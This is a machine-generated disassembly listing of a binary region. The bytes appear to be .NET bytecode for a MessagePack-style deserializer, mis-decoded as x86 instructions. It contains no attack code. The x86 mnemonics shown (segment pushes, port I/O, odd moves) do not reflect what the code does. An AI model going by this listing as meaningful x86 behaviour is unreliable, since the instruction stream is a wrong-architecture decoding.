  404c35:	6f                   	outsl  %ds:(%esi),(%dx)
  404c36:	26 00 00             	add    %al,%es:(%eax)
  404c39:	0a 0b                	or     (%ebx),%cl
  404c3b:	14 0c                	adc    $0xc,%al
  404c3d:	07                   	pop    %es
  404c3e:	8e 3a                	mov    (%edx),%?
  404c40:	02 00                	add    (%eax),%al
  404c42:	00 00                	add    %al,(%eax)
  404c44:	14 2a                	adc    $0x2a,%al
  404c46:	07                   	pop    %es
  404c47:	8e 69 17             	mov    0x17(%ecx),%gs
  404c4a:	3e 41                	ds inc %ecx
  404c4c:	00 00                	add    %al,(%eax)
  404c4e:	00 16                	add    %dl,(%esi)
  404c50:	0d 38 32 00 00       	or     $0x3238,%eax
  404c55:	00 07                	add    %al,(%edi)
  404c57:	09 a3 38 00 00 01    	or     %esp,0x1000038(%ebx)
  404c5d:	0c 06                	or     $0x6,%al
  404c5f:	08 6f 6e             	or     %ch,0x6e(%edi)
  404c62:	00 00                	add    %al,(%eax)
  404c64:	06                   	push   %es
  404c65:	13 04 11             	adc    (%ecx,%edx,1),%eax
  404c68:	04 3a                	add    $0x3a,%al
  404c6a:	13 00                	adc    (%eax),%eax
  404c6c:	00 00                	add    %al,(%eax)
  404c6e:	06                   	push   %es
  404c6f:	6f                   	outsl  %ds:(%esi),(%dx)
  404c70:	6f                   	outsl  %ds:(%esi),(%dx)
  404c71:	00 00                	add    %al,(%eax)
  404c73:	06                   	push   %es
  404c74:	0a 06                	or     (%esi),%al
  404c76:	08 6f 6a             	or     %ch,0x6a(%edi)
  404c79:	00 00                	add    %al,(%eax)
  404c7b:	06                   	push   %es
  404c7c:	38 03                	cmp    %al,(%ebx)
  404c7e:	00 00                	add    %al,(%eax)
  404c80:	00 11                	add    %dl,(%ecx)
  404c82:	04 0a                	add    $0xa,%al
  404c84:	09 17                	or     %edx,(%edi)
  404c86:	58                   	pop    %eax
  404c87:	0d 09 07 8e 69       	or     $0x698e0709,%eax
  404c8c:	17                   	pop    %ss
  404c8d:	59                   	pop    %ecx
  404c8e:	32 c6                	xor    %dh,%al
  404c90:	07                   	pop    %es
  404c91:	07                   	pop    %es
  404c92:	8e 69 17             	mov    0x17(%ecx),%gs
  404c95:	59                   	pop    %ecx
  404c96:	a3 38 00 00 01       	mov    %eax,0x1000038
  404c9b:	0c 06                	or     $0x6,%al
  404c9d:	08 6f 6d             	or     %ch,0x6d(%edi)
  404ca0:	00 00                	add    %al,(%eax)
  404ca2:	06                   	push   %es
  404ca3:	13 05 11 05 15 3e    	adc    0x3e150511,%eax
  404ca9:	0e                   	push   %cs
  404caa:	00 00                	add    %al,(%eax)
  404cac:	00 06                	add    %al,(%esi)
  404cae:	7b 38                	jnp    0x404ce8
  404cb0:	00 00                	add    %al,(%eax)
  404cb2:	04 11                	add    $0x11,%al
  404cb4:	05 6f ea 00 00       	add    $0xea6f,%eax
  404cb9:	0a 2a                	or     (%edx),%ch
  404cbb:	06                   	push   %es
  404cbc:	6f                   	outsl  %ds:(%esi),(%dx)
  404cbd:	6f                   	outsl  %ds:(%esi),(%dx)
  404cbe:	00 00                	add    %al,(%eax)
  404cc0:	06                   	push   %es
  404cc1:	0a 06                	or     (%esi),%al
  404cc3:	08 6f 6a             	or     %ch,0x6a(%edi)
  404cc6:	00 00                	add    %al,(%eax)
  404cc8:	06                   	push   %es
  404cc9:	06                   	push   %es
  404cca:	2a 00                	sub    (%eax),%al
  404ccc:	1b 30                	sbb    (%eax),%esi
  404cce:	04 00                	add    $0x0,%al
  404cd0:	3b 00                	cmp    (%eax),%eax
  404cd2:	00 00                	add    %al,(%eax)
  404cd4:	24 00                	and    $0x0,%al
  404cd6:	00 11                	add    %dl,(%ecx)
  404cd8:	73 d0                	jae    0x404caa
  404cda:	00 00                	add    %al,(%eax)
  404cdc:	0a 0a                	or     (%edx),%cl
  404cde:	03 28                	add    (%eax),%ebp
  404ce0:	a2 00 00 06 10       	mov    %al,0x10060000
  404ce5:	01 06                	add    %eax,(%esi)
  404ce7:	03 16                	add    (%esi),%edx
  404ce9:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404cef:	00 0a                	add    %cl,(%edx)
  404cf1:	06                   	push   %es
  404cf2:	16                   	push   %ss
  404cf3:	6a 6f                	push   $0x6f
  404cf5:	4e                   	dec    %esi
  404cf6:	00 00                	add    %al,(%eax)
  404cf8:	0a 02                	or     (%edx),%al
  404cfa:	06                   	push   %es
  404cfb:	28 88 00 00 06 dd    	sub    %cl,-0x22fa0000(%eax)
  404d01:	0d 00 00 00 06       	or     $0x6000000,%eax
  404d06:	39 06                	cmp    %eax,(%esi)
  404d08:	00 00                	add    %al,(%eax)
  404d0a:	00 06                	add    %al,(%esi)
  404d0c:	6f                   	outsl  %ds:(%esi),(%dx)
  404d0d:	33 00                	xor    (%eax),%eax
  404d0f:	00 0a                	add    %cl,(%edx)
  404d11:	dc 2a                	fsubrl (%edx)
  404d13:	00 01                	add    %al,(%ecx)
  404d15:	10 00                	adc    %al,(%eax)
  404d17:	00 02                	add    %al,(%edx)
  404d19:	00 06                	add    %al,(%esi)
  404d1b:	00 27                	add    %ah,(%edi)
  404d1d:	2d 00 0d 00 00       	sub    $0xd00,%eax
  404d22:	00 00                	add    %al,(%eax)
  404d24:	13 30                	adc    (%eax),%esi
  404d26:	02 00                	add    (%eax),%al
  404d28:	16                   	push   %ss
  404d29:	00 00                	add    %al,(%eax)
  404d2b:	00 25 00 00 11 03    	add    %ah,0x3110000
  404d31:	19 73 6c             	sbb    %esi,0x6c(%ebx)
  404d34:	00 00                	add    %al,(%eax)
  404d36:	0a 0a                	or     (%edx),%cl
  404d38:	02 06                	add    (%esi),%al
  404d3a:	28 88 00 00 06 06    	sub    %cl,0x6060000(%eax)
  404d40:	6f                   	outsl  %ds:(%esi),(%dx)
  404d41:	40                   	inc    %eax
  404d42:	00 00                	add    %al,(%eax)
  404d44:	0a 2a                	or     (%edx),%ch
  404d46:	00 00                	add    %al,(%eax)
  404d48:	13 30                	adc    (%eax),%esi
  404d4a:	04 00                	add    $0x0,%al
  404d4c:	07                   	pop    %es
  404d4d:	06                   	push   %es
  404d4e:	00 00                	add    %al,(%eax)
  404d50:	26 00 00             	add    %al,%es:(%eax)
  404d53:	11 03                	adc    %eax,(%ebx)
  404d55:	6f                   	outsl  %ds:(%esi),(%dx)
  404d56:	00 01                	add    %al,(%ecx)
  404d58:	00 0a                	add    %cl,(%edx)
  404d5a:	d2 0a                	rorb   %cl,(%edx)
  404d5c:	14 0b                	adc    $0xb,%al
  404d5e:	16                   	push   %ss
  404d5f:	0c 16                	or     $0x16,%al
  404d61:	0d 06 1f 7f 3d       	or     $0x3d7f1f06,%eax
  404d66:	09 00                	or     %eax,(%eax)
  404d68:	00 00                	add    %al,(%eax)
  404d6a:	02 06                	add    (%esi),%al
  404d6c:	6e                   	outsb  %ds:(%esi),(%dx)
  404d6d:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  404d71:	06                   	push   %es
  404d72:	2a 06                	sub    (%esi),%al
  404d74:	20 80 00 00 00 3f    	and    %al,0x3f000000(%eax)
  404d7a:	48                   	dec    %eax
  404d7b:	00 00                	add    %al,(%eax)
  404d7d:	00 06                	add    %al,(%esi)
  404d7f:	20 8f 00 00 00 3d    	and    %cl,0x3d000000(%edi)
  404d85:	3d 00 00 00 02       	cmp    $0x2000000,%eax
  404d8a:	28 6b 00             	sub    %ch,0x0(%ebx)
  404d8d:	00 06                	add    %al,(%esi)
  404d8f:	02 18                	add    (%eax),%bl
  404d91:	7d 36                	jge    0x404dc9
  404d93:	00 00                	add    %al,(%eax)
  404d95:	04 06                	add    $0x6,%al
  404d97:	20 80 00 00 00 59    	and    %al,0x59000000(%eax)
  404d9d:	0c 16                	or     $0x16,%al
  404d9f:	0d 38 1c 00 00       	or     $0x1c38,%eax
  404da4:	00 02                	add    %al,(%edx)
  404da6:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404daa:	06                   	push   %es
  404dab:	25 03 28 96 00       	and    $0x962803,%eax
  404db0:	00 06                	add    %al,(%esi)
  404db2:	6f                   	outsl  %ds:(%esi),(%dx)
  404db3:	6a 00                	push   $0x0
  404db5:	00 06                	add    %al,(%esi)
  404db7:	03 6f 88             	add    -0x78(%edi),%ebp
  404dba:	00 00                	add    %al,(%eax)
  404dbc:	06                   	push   %es
  404dbd:	09 17                	or     %edx,(%edi)
  404dbf:	58                   	pop    %eax
  404dc0:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  404dc5:	2a 06                	sub    (%esi),%al
  404dc7:	20 90 00 00 00 3f    	and    %dl,0x3f000000(%eax)
  404dcd:	3c 00                	cmp    $0x0,%al
  404dcf:	00 00                	add    %al,(%eax)
  404dd1:	06                   	push   %es
  404dd2:	20 9f 00 00 00 3d    	and    %bl,0x3d000000(%edi)
  404dd8:	31 00                	xor    %eax,(%eax)
  404dda:	00 00                	add    %al,(%eax)
  404ddc:	02 28                	add    (%eax),%ch
  404dde:	6b 00 00             	imul   $0x0,(%eax),%eax
  404de1:	06                   	push   %es
  404de2:	02 19                	add    (%ecx),%bl
  404de4:	7d 36                	jge    0x404e1c
  404de6:	00 00                	add    %al,(%eax)
  404de8:	04 06                	add    $0x6,%al
  404dea:	20 90 00 00 00 59    	and    %dl,0x59000000(%eax)
  404df0:	0c 16                	or     $0x16,%al
  404df2:	0d 38 10 00 00       	or     $0x1038,%eax
  404df7:	00 02                	add    %al,(%edx)
  404df9:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  404dfd:	06                   	push   %es
  404dfe:	03 6f 88             	add    -0x78(%edi),%ebp
  404e01:	00 00                	add    %al,(%eax)
  404e03:	06                   	push   %es
  404e04:	09 17                	or     %edx,(%edi)
  404e06:	58                   	pop    %eax
  404e07:	0d 09 08 32 ec       	or     $0xec320809,%eax
  404e0c:	2a 06                	sub    (%esi),%al
  404e0e:	20 a0 00 00 00 3f    	and    %ah,0x3f000000(%eax)
  404e14:	21 00                	and    %eax,(%eax)
  404e16:	00 00                	add    %al,(%eax)
  404e18:	06                   	push   %es
  404e19:	20 bf 00 00 00 3d    	and    %bh,0x3d000000(%edi)
  404e1f:	16                   	push   %ss
  404e20:	00 00                	add    %al,(%eax)
  404e22:	00 06                	add    %al,(%esi)
  404e24:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  404e2a:	0c 02                	or     $0x2,%al
  404e2c:	03 08                	add    (%eax),%ecx
  404e2e:	28 95 00 00 06 28    	sub    %dl,0x28060000(%ebp)
  404e34:	81 00 00 06 2a 06    	addl   $0x62a0600,(%eax)
  404e3a:	20 e0                	and    %ah,%al
  404e3c:	00 00                	add    %al,(%eax)
  404e3e:	00 3f                	add    %bh,(%edi)
  404e40:	15 00 00 00 06       	adc    $0x6000000,%eax
  404e45:	20 ff                	and    %bh,%bh
  404e47:	00 00                	add    %al,(%eax)
  404e49:	00 3d 0a 00 00 00    	add    %bh,0xa
  404e4f:	02 06                	add    (%esi),%al
  404e51:	67 6a 28             	addr16 push $0x28
  404e54:	74 00                	je     0x404e56
  404e56:	00 06                	add    %al,(%esi)
  404e58:	2a 06                	sub    (%esi),%al
  404e5a:	20 c0                	and    %al,%al
  404e5c:	00 00                	add    %al,(%eax)
  404e5e:	00 40 07             	add    %al,0x7(%eax)
  404e61:	00 00                	add    %al,(%eax)
  404e63:	00 02                	add    %al,(%edx)
  404e65:	28 80 00 00 06 2a    	sub    %al,0x2a060000(%eax)
  404e6b:	06                   	push   %es
  404e6c:	20 c1                	and    %al,%cl
  404e6e:	00 00                	add    %al,(%eax)
  404e70:	00 40 0b             	add    %al,0xb(%eax)
  404e73:	00 00                	add    %al,(%eax)
  404e75:	00 72 ac             	add    %dh,-0x54(%edx)
  404e78:	29 00                	sub    %eax,(%eax)
  404e7a:	70 73                	jo     0x404eef
  404e7c:	01 01                	add    %eax,(%ecx)
  404e7e:	00 0a                	add    %cl,(%edx)
  404e80:	7a 06                	jp     0x404e88
  404e82:	20 c2                	and    %al,%dl
  404e84:	00 00                	add    %al,(%eax)
  404e86:	00 40 08             	add    %al,0x8(%eax)
  404e89:	00 00                	add    %al,(%eax)
  404e8b:	00 02                	add    %al,(%edx)
  404e8d:	16                   	push   %ss
  404e8e:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404e94:	06                   	push   %es
  404e95:	20 c3                	and    %al,%bl
  404e97:	00 00                	add    %al,(%eax)
  404e99:	00 40 08             	add    %al,0x8(%eax)
  404e9c:	00 00                	add    %al,(%eax)
  404e9e:	00 02                	add    %al,(%edx)
  404ea0:	17                   	pop    %ss
  404ea1:	28 83 00 00 06 2a    	sub    %al,0x2a060000(%ebx)
  404ea7:	06                   	push   %es
  404ea8:	20 c4                	and    %al,%ah
  404eaa:	00 00                	add    %al,(%eax)
  404eac:	00 40 20             	add    %al,0x20(%eax)
  404eaf:	00 00                	add    %al,(%eax)
  404eb1:	00 03                	add    %al,(%ebx)
  404eb3:	6f                   	outsl  %ds:(%esi),(%dx)
  404eb4:	00 01                	add    %al,(%ecx)
  404eb6:	00 0a                	add    %cl,(%edx)
  404eb8:	0c 08                	or     $0x8,%al
  404eba:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404ebe:	01 0b                	add    %ecx,(%ebx)
  404ec0:	03 07                	add    (%edi),%eax
  404ec2:	16                   	push   %ss
  404ec3:	08 6f 45             	or     %ch,0x45(%edi)
  404ec6:	00 00                	add    %al,(%eax)
  404ec8:	0a 26                	or     (%esi),%ah
  404eca:	02 07                	add    (%edi),%al
  404ecc:	28 79 00             	sub    %bh,0x0(%ecx)
  404ecf:	00 06                	add    %al,(%esi)
  404ed1:	2a 06                	sub    (%esi),%al
  404ed3:	20 c5                	and    %al,%ch
  404ed5:	00 00                	add    %al,(%eax)
  404ed7:	00 40 39             	add    %al,0x39(%eax)
  404eda:	00 00                	add    %al,(%eax)
  404edc:	00 18                	add    %bl,(%eax)
  404ede:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404ee2:	01 0b                	add    %ecx,(%ebx)
  404ee4:	03 07                	add    (%edi),%eax
  404ee6:	16                   	push   %ss
  404ee7:	18 6f 45             	sbb    %ch,0x45(%edi)
  404eea:	00 00                	add    %al,(%eax)
  404eec:	0a 26                	or     (%esi),%ah
  404eee:	07                   	pop    %es
  404eef:	28 58 00             	sub    %bl,0x0(%eax)
  404ef2:	00 06                	add    %al,(%esi)
  404ef4:	0b 07                	or     (%edi),%eax
  404ef6:	16                   	push   %ss
  404ef7:	28 02                	sub    %al,(%edx)
  404ef9:	01 00                	add    %eax,(%eax)
  404efb:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404efe:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f02:	01 0b                	add    %ecx,(%ebx)
  404f04:	03 07                	add    (%edi),%eax
  404f06:	16                   	push   %ss
  404f07:	08 6f 45             	or     %ch,0x45(%edi)
  404f0a:	00 00                	add    %al,(%eax)
  404f0c:	0a 26                	or     (%esi),%ah
  404f0e:	02 07                	add    (%edi),%al
  404f10:	28 79 00             	sub    %bh,0x0(%ecx)
  404f13:	00 06                	add    %al,(%esi)
  404f15:	2a 06                	sub    (%esi),%al
  404f17:	20 c6                	and    %al,%dh
  404f19:	00 00                	add    %al,(%eax)
  404f1b:	00 40 39             	add    %al,0x39(%eax)
  404f1e:	00 00                	add    %al,(%eax)
  404f20:	00 1a                	add    %bl,(%edx)
  404f22:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f26:	01 0b                	add    %ecx,(%ebx)
  404f28:	03 07                	add    (%edi),%eax
  404f2a:	16                   	push   %ss
  404f2b:	1a 6f 45             	sbb    0x45(%edi),%ch
  404f2e:	00 00                	add    %al,(%eax)
  404f30:	0a 26                	or     (%esi),%ah
  404f32:	07                   	pop    %es
  404f33:	28 58 00             	sub    %bl,0x0(%eax)
  404f36:	00 06                	add    %al,(%esi)
  404f38:	0b 07                	or     (%edi),%eax
  404f3a:	16                   	push   %ss
  404f3b:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  404f3f:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404f42:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f46:	01 0b                	add    %ecx,(%ebx)
  404f48:	03 07                	add    (%edi),%eax
  404f4a:	16                   	push   %ss
  404f4b:	08 6f 45             	or     %ch,0x45(%edi)
  404f4e:	00 00                	add    %al,(%eax)
  404f50:	0a 26                	or     (%esi),%ah
  404f52:	02 07                	add    (%edi),%al
  404f54:	28 79 00             	sub    %bh,0x0(%ecx)
  404f57:	00 06                	add    %al,(%esi)
  404f59:	2a 06                	sub    (%esi),%al
  404f5b:	20 c7                	and    %al,%bh
  404f5d:	00 00                	add    %al,(%eax)
  404f5f:	00 3b                	add    %bh,(%ebx)
  404f61:	16                   	push   %ss
  404f62:	00 00                	add    %al,(%eax)
  404f64:	00 06                	add    %al,(%esi)
  404f66:	20 c8                	and    %cl,%al
  404f68:	00 00                	add    %al,(%eax)
  404f6a:	00 3b                	add    %bh,(%ebx)
  404f6c:	0b 00                	or     (%eax),%eax
  404f6e:	00 00                	add    %al,(%eax)
  404f70:	06                   	push   %es
  404f71:	20 c9                	and    %cl,%cl
  404f73:	00 00                	add    %al,(%eax)
  404f75:	00 40 0b             	add    %al,0xb(%eax)
  404f78:	00 00                	add    %al,(%eax)
  404f7a:	00 72 d8             	add    %dh,-0x28(%edx)
  404f7d:	29 00                	sub    %eax,(%eax)
  404f7f:	70 73                	jo     0x404ff4
  404f81:	01 01                	add    %eax,(%ecx)
  404f83:	00 0a                	add    %cl,(%edx)
  404f85:	7a 06                	jp     0x404f8d
  404f87:	20 ca                	and    %cl,%dl
  404f89:	00 00                	add    %al,(%eax)
  404f8b:	00 40 26             	add    %al,0x26(%eax)
  404f8e:	00 00                	add    %al,(%eax)
  404f90:	00 1a                	add    %bl,(%edx)
  404f92:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404f96:	01 0b                	add    %ecx,(%ebx)
  404f98:	03 07                	add    (%edi),%eax
  404f9a:	16                   	push   %ss
  404f9b:	1a 6f 45             	sbb    0x45(%edi),%ch
  404f9e:	00 00                	add    %al,(%eax)
  404fa0:	0a 26                	or     (%esi),%ah
  404fa2:	07                   	pop    %es
  404fa3:	28 58 00             	sub    %bl,0x0(%eax)
  404fa6:	00 06                	add    %al,(%esi)
  404fa8:	0b 02                	or     (%edx),%eax
  404faa:	07                   	pop    %es
  404fab:	16                   	push   %ss
  404fac:	28 03                	sub    %al,(%ebx)
  404fae:	01 00                	add    %eax,(%eax)
  404fb0:	0a 28                	or     (%eax),%ch
  404fb2:	84 00                	test   %al,(%eax)
  404fb4:	00 06                	add    %al,(%esi)
  404fb6:	2a 06                	sub    (%esi),%al
  404fb8:	20 cb                	and    %cl,%bl
  404fba:	00 00                	add    %al,(%eax)
  404fbc:	00 40 26             	add    %al,0x26(%eax)
  404fbf:	00 00                	add    %al,(%eax)
  404fc1:	00 1e                	add    %bl,(%esi)
  404fc3:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  404fc7:	01 0b                	add    %ecx,(%ebx)
  404fc9:	03 07                	add    (%edi),%eax
  404fcb:	16                   	push   %ss
  404fcc:	1e                   	push   %ds
  404fcd:	6f                   	outsl  %ds:(%esi),(%dx)
  404fce:	45                   	inc    %ebp
  404fcf:	00 00                	add    %al,(%eax)
  404fd1:	0a 26                	or     (%esi),%ah
  404fd3:	07                   	pop    %es
  404fd4:	28 58 00             	sub    %bl,0x0(%eax)
  404fd7:	00 06                	add    %al,(%esi)
  404fd9:	0b 02                	or     (%edx),%eax
  404fdb:	07                   	pop    %es
  404fdc:	16                   	push   %ss
  404fdd:	28 04 01             	sub    %al,(%ecx,%eax,1)
  404fe0:	00 0a                	add    %cl,(%edx)
  404fe2:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  404fe8:	06                   	push   %es
  404fe9:	20 cc                	and    %cl,%ah
  404feb:	00 00                	add    %al,(%eax)
  404fed:	00 40 11             	add    %al,0x11(%eax)
  404ff0:	00 00                	add    %al,(%eax)
  404ff2:	00 03                	add    %al,(%ebx)
  404ff4:	6f                   	outsl  %ds:(%esi),(%dx)
  404ff5:	00 01                	add    %al,(%ecx)
  404ff7:	00 0a                	add    %cl,(%edx)
  404ff9:	d2 0a                	rorb   %cl,(%edx)
  404ffb:	02 06                	add    (%esi),%al
  404ffd:	6e                   	outsb  %ds:(%esi),(%dx)
  404ffe:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  405002:	06                   	push   %es
  405003:	2a 06                	sub    (%esi),%al
  405005:	20 cd                	and    %cl,%ch
  405007:	00 00                	add    %al,(%eax)
  405009:	00 40 27             	add    %al,0x27(%eax)
  40500c:	00 00                	add    %al,(%eax)
  40500e:	00 18                	add    %bl,(%eax)
  405010:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405014:	01 0b                	add    %ecx,(%ebx)
  405016:	03 07                	add    (%edi),%eax
  405018:	16                   	push   %ss
  405019:	18 6f 45             	sbb    %ch,0x45(%edi)
  40501c:	00 00                	add    %al,(%eax)
  40501e:	0a 26                	or     (%esi),%ah
  405020:	07                   	pop    %es
  405021:	28 58 00             	sub    %bl,0x0(%eax)
  405024:	00 06                	add    %al,(%esi)
  405026:	0b 02                	or     (%edx),%eax
  405028:	07                   	pop    %es
  405029:	16                   	push   %ss
  40502a:	28 02                	sub    %al,(%edx)
  40502c:	01 00                	add    %eax,(%eax)
  40502e:	0a 6e 28             	or     0x28(%esi),%ch
  405031:	74 00                	je     0x405033
  405033:	00 06                	add    %al,(%esi)
  405035:	2a 06                	sub    (%esi),%al
  405037:	20 ce                	and    %cl,%dh
  405039:	00 00                	add    %al,(%eax)
  40503b:	00 40 27             	add    %al,0x27(%eax)
  40503e:	00 00                	add    %al,(%eax)
  405040:	00 1a                	add    %bl,(%edx)
  405042:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405046:	01 0b                	add    %ecx,(%ebx)
  405048:	03 07                	add    (%edi),%eax
  40504a:	16                   	push   %ss
  40504b:	1a 6f 45             	sbb    0x45(%edi),%ch
  40504e:	00 00                	add    %al,(%eax)
  405050:	0a 26                	or     (%esi),%ah
  405052:	07                   	pop    %es
  405053:	28 58 00             	sub    %bl,0x0(%eax)
  405056:	00 06                	add    %al,(%esi)
  405058:	0b 02                	or     (%edx),%eax
  40505a:	07                   	pop    %es
  40505b:	16                   	push   %ss
  40505c:	28 05 01 00 0a 6e    	sub    %al,0x6e0a0001
  405062:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  405066:	06                   	push   %es
  405067:	2a 06                	sub    (%esi),%al
  405069:	20 cf                	and    %cl,%bh
  40506b:	00 00                	add    %al,(%eax)
  40506d:	00 40 26             	add    %al,0x26(%eax)
  405070:	00 00                	add    %al,(%eax)
  405072:	00 1e                	add    %bl,(%esi)
  405074:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405078:	01 0b                	add    %ecx,(%ebx)
  40507a:	03 07                	add    (%edi),%eax
  40507c:	16                   	push   %ss
  40507d:	1e                   	push   %ds
  40507e:	6f                   	outsl  %ds:(%esi),(%dx)
  40507f:	45                   	inc    %ebp
  405080:	00 00                	add    %al,(%eax)
  405082:	0a 26                	or     (%esi),%ah
  405084:	07                   	pop    %es
  405085:	28 58 00             	sub    %bl,0x0(%eax)
  405088:	00 06                	add    %al,(%esi)
  40508a:	0b 02                	or     (%edx),%eax
  40508c:	07                   	pop    %es
  40508d:	16                   	push   %ss
  40508e:	28 06                	sub    %al,(%esi)
  405090:	01 00                	add    %eax,(%eax)
  405092:	0a 28                	or     (%eax),%ch
  405094:	75 00                	jne    0x405096
  405096:	00 06                	add    %al,(%esi)
  405098:	2a 06                	sub    (%esi),%al
  40509a:	20 dc                	and    %bl,%ah
  40509c:	00 00                	add    %al,(%eax)
  40509e:	00 40 49             	add    %al,0x49(%eax)
  4050a1:	00 00                	add    %al,(%eax)
  4050a3:	00 18                	add    %bl,(%eax)
  4050a5:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4050a9:	01 0b                	add    %ecx,(%ebx)
  4050ab:	03 07                	add    (%edi),%eax
  4050ad:	16                   	push   %ss
  4050ae:	18 6f 45             	sbb    %ch,0x45(%edi)
  4050b1:	00 00                	add    %al,(%eax)
  4050b3:	0a 26                	or     (%esi),%ah
  4050b5:	07                   	pop    %es
  4050b6:	28 58 00             	sub    %bl,0x0(%eax)
  4050b9:	00 06                	add    %al,(%esi)
  4050bb:	0b 07                	or     (%edi),%eax
  4050bd:	16                   	push   %ss
  4050be:	28 07                	sub    %al,(%edi)
  4050c0:	01 00                	add    %eax,(%eax)
  4050c2:	0a 0c 02             	or     (%edx,%eax,1),%cl
  4050c5:	28 6b 00             	sub    %ch,0x0(%ebx)
  4050c8:	00 06                	add    %al,(%esi)
  4050ca:	02 19                	add    (%ecx),%bl
  4050cc:	7d 36                	jge    0x405104
  4050ce:	00 00                	add    %al,(%eax)
  4050d0:	04 16                	add    $0x16,%al
  4050d2:	0d 38 10 00 00       	or     $0x1038,%eax
  4050d7:	00 02                	add    %al,(%edx)
  4050d9:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4050dd:	06                   	push   %es
  4050de:	03 6f 88             	add    -0x78(%edi),%ebp
  4050e1:	00 00                	add    %al,(%eax)
  4050e3:	06                   	push   %es
  4050e4:	09 17                	or     %edx,(%edi)
  4050e6:	58                   	pop    %eax
  4050e7:	0d 09 08 32 ec       	or     $0xec320809,%eax
  4050ec:	2a 06                	sub    (%esi),%al
  4050ee:	20 dd                	and    %bl,%ch
  4050f0:	00 00                	add    %al,(%eax)
  4050f2:	00 40 49             	add    %al,0x49(%eax)
  4050f5:	00 00                	add    %al,(%eax)
  4050f7:	00 1a                	add    %bl,(%edx)
  4050f9:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4050fd:	01 0b                	add    %ecx,(%ebx)
  4050ff:	03 07                	add    (%edi),%eax
  405101:	16                   	push   %ss
  405102:	1a 6f 45             	sbb    0x45(%edi),%ch
  405105:	00 00                	add    %al,(%eax)
  405107:	0a 26                	or     (%esi),%ah
  405109:	07                   	pop    %es
  40510a:	28 58 00             	sub    %bl,0x0(%eax)
  40510d:	00 06                	add    %al,(%esi)
  40510f:	0b 07                	or     (%edi),%eax
  405111:	16                   	push   %ss
  405112:	28 07                	sub    %al,(%edi)
  405114:	01 00                	add    %eax,(%eax)
  405116:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405119:	28 6b 00             	sub    %ch,0x0(%ebx)
  40511c:	00 06                	add    %al,(%esi)
  40511e:	02 19                	add    (%ecx),%bl
  405120:	7d 36                	jge    0x405158
  405122:	00 00                	add    %al,(%eax)
  405124:	04 16                	add    $0x16,%al
  405126:	0d 38 10 00 00       	or     $0x1038,%eax
  40512b:	00 02                	add    %al,(%edx)
  40512d:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  405131:	06                   	push   %es
  405132:	03 6f 88             	add    -0x78(%edi),%ebp
  405135:	00 00                	add    %al,(%eax)
  405137:	06                   	push   %es
  405138:	09 17                	or     %edx,(%edi)
  40513a:	58                   	pop    %eax
  40513b:	0d 09 08 32 ec       	or     $0xec320809,%eax
  405140:	2a 06                	sub    (%esi),%al
  405142:	20 d9                	and    %bl,%cl
  405144:	00 00                	add    %al,(%eax)
  405146:	00 40 0e             	add    %al,0xe(%eax)
  405149:	00 00                	add    %al,(%eax)
  40514b:	00 02                	add    %al,(%edx)
  40514d:	06                   	push   %es
  40514e:	03 28                	add    (%eax),%ebp
  405150:	97                   	xchg   %eax,%edi
  405151:	00 00                	add    %al,(%eax)
  405153:	06                   	push   %es
  405154:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  40515a:	06                   	push   %es
  40515b:	20 de                	and    %bl,%dh
  40515d:	00 00                	add    %al,(%eax)
  40515f:	00 40 55             	add    %al,0x55(%eax)
  405162:	00 00                	add    %al,(%eax)
  405164:	00 18                	add    %bl,(%eax)
  405166:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40516a:	01 0b                	add    %ecx,(%ebx)
  40516c:	03 07                	add    (%edi),%eax
  40516e:	16                   	push   %ss
  40516f:	18 6f 45             	sbb    %ch,0x45(%edi)
  405172:	00 00                	add    %al,(%eax)
  405174:	0a 26                	or     (%esi),%ah
  405176:	07                   	pop    %es
  405177:	28 58 00             	sub    %bl,0x0(%eax)
  40517a:	00 06                	add    %al,(%esi)
  40517c:	0b 07                	or     (%edi),%eax
  40517e:	16                   	push   %ss
  40517f:	28 07                	sub    %al,(%edi)
  405181:	01 00                	add    %eax,(%eax)
  405183:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405186:	28 6b 00             	sub    %ch,0x0(%ebx)
  405189:	00 06                	add    %al,(%esi)
  40518b:	02 18                	add    (%eax),%bl
  40518d:	7d 36                	jge    0x4051c5
  40518f:	00 00                	add    %al,(%eax)
  405191:	04 16                	add    $0x16,%al
  405193:	0d 38 1c 00 00       	or     $0x1c38,%eax
  405198:	00 02                	add    %al,(%edx)
  40519a:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40519e:	06                   	push   %es
  40519f:	25 03 28 96 00       	and    $0x962803,%eax
  4051a4:	00 06                	add    %al,(%esi)
  4051a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4051a7:	6a 00                	push   $0x0
  4051a9:	00 06                	add    %al,(%esi)
  4051ab:	03 6f 88             	add    -0x78(%edi),%ebp
